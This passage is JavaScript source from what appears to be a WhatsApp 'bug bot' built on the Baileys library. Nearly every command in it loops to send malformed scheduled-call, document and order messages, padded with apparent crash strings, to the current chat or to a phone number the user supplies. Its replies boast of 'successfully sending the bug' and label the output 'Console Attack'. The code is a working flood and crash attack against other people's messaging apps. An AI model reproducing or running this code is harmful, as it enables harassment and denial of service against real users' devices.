attention(`open war|𝐃𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`open war|𝐒⸙𝐀࿈𝐌${zetsubonotgay}${ios1}.${ios2}`)
await sleep(1000) 

}
break
//=================================================//
case 'unlidelay' : {
if (!isCreator) return reply('*Premium Command*')
await loading()
attention = async (teks) => {
let schedule = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "AUDIO",
"scheduledTimestampMs": 0,
"title": teks, 
}
}), { userJid: from, quoted: kalgans })
zetsubo.relayMessage(from, schedule.message, { messageId: schedule.key.id })
	}
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
attention(`open war|zetsubo${zetsubonotgay}${ios1}.${ios2}.${mdelay}`)
await sleep(1000) 
}
break
//=================================================//
//=================================================//
case 'unlidocu': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
jumlah = "18"
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "༐༑⿻⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓⧉⸙⫺⿻༔༐༑",
"title": "༐༑⿻𝑺⸙𝑨᪣𝑴𖤓𝐕𝐢𝐒𝐢𝐎𝐍⿻༔༐༑",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `Zetsubo - Console V1.${bugui}`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` ༐༑⿻𝐒⸙𝐀࿈𝐌𖤓𝐕𝐢𝐒𝐢𝐎𝐍⿻༔༐༑.${buttonkal}`,
}
}), { userJid: from, quoted:kalgans})
zetsubo.relayMessage(from, document.message, { messageId: document.key.id })
}
await sleep(2000)
}
break

//=================================================//
case 'unlitroli': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
jumlah = "15"
zetsorder = async (teks) => {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 2027,
"status": "INQUIRY",
"surface": "CATALOG",
"message": teks,
"orderTitle": `༐༑⿻𝐒⸙𝐀࿈𝐌➟𝐕𝐢𝐒𝐢𝐎𝐍⿻༔༐༑`, // 
"sellerJid": "6289503267904@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted : kalgans})
zetsubo.relayMessage(from, order.message, { messageId: order.key.id })
}
for (let i = 0; i < jumlah; i++) {
zetsorder(`😈𝐒⸙𝐀࿈𝐌⚸𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
zetsorder(`😈𝐒⸙𝐀࿈𝐌𝐗𝐆𝟎𝐃𝟕𝟕𝟕 • 𝐃𝟎𝐌𝐢𝐍𝐀𝐓𝐄🌟${bugui}`)
await sleep(1500)
}
}
break
//=================================================//
case 'sendunlidocu': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
if (args.length < 1) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6289503267904`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "18"
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "༐༑⿻⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓⧉⸙⫺⿻༔༐༑",
"title": "༐༑⿻𝐒⸙𝐀࿈𝐌𖤓𝐕𝐢𝐒𝐢𝐎𝐍⿻༔༐༑",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `Zetsubo - Console V1.${bugui}`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` ༐༑⿻𝐂𝐋𝐀𝐒𝐒𝐈𝐂𖤓𝐕𝐢𝐒𝐢𝐎𝐍⿻༔༐༑.${buttonkal}`,
}
}), { userJid: from, quoted:kalgans})
zetsubo.relayMessage(bnnd, document.message, { messageId: document.key.id })
}
reply(`*Sukses mengirim Bug Ke ${bnnd} Tolong Jeda 3 Menit Yah*`)
}
break
//=================================================//
case 'sendunlitroli': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6289503267904`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "18"
for (let i = 0; i < jumlah; i++) {
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${botname}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " BUG TROLI ", // 
"sellerJid": "6289503267904@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
zetsubo.relayMessage(bnnd, order.message, { messageId: order.key.id })
}
reply(`*Sukses mengirim Bug Ke ${bnnd} Tolong Jeda 3 Menit Yah*`)
}
break
//=================================================//
case '🐵' : case '🙈' : case '🙉' : case '🙊' : case '🐒' : case 'thezets' : case '🥑' : case '🥒' : case '🌽' : case '🍠' : case '🥕' : case '🌶' : case '🍅' : case '🥥' : case '🥝' : case '🍐' : case '🍏' : case '🍈' : {
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
Pe = text.split("|")[0]+'@s.whatsapp.net'
jumlah = "3"
konsol = async (teks) => {
let schedule = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "AUDIO",
"scheduledTimestampMs": 0,
"title": teks, 
}
}), { userJid: from, quoted: kalgans })
zetsubo.relayMessage(Pe, schedule.message, { messageId: schedule.key.id })
	}
for (let i = 0; i < jumlah; i++) {
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
konsol(`Console Attack | Zetsubo${bugui}${ios1}.${ios2}`)
await sleep(1000) 
